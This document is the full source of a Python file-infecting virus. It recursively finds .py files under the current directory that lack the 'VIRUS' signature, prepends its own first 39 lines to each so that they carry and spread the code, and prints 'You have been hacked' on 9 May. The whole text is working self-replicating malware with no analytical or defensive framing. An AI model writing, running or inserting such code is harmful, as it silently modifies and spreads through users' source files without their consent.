#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

# Function to locate files in given path
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to infect files by using the virus code
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

# Function to check date and print a message if it matches specified date
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate files in the current directory and subdirectories
files_targeted = locate(os.path.abspath(""))

# Infect the files that are not already infected
infect(files_targeted)

# Check the date and print a message
detonate()
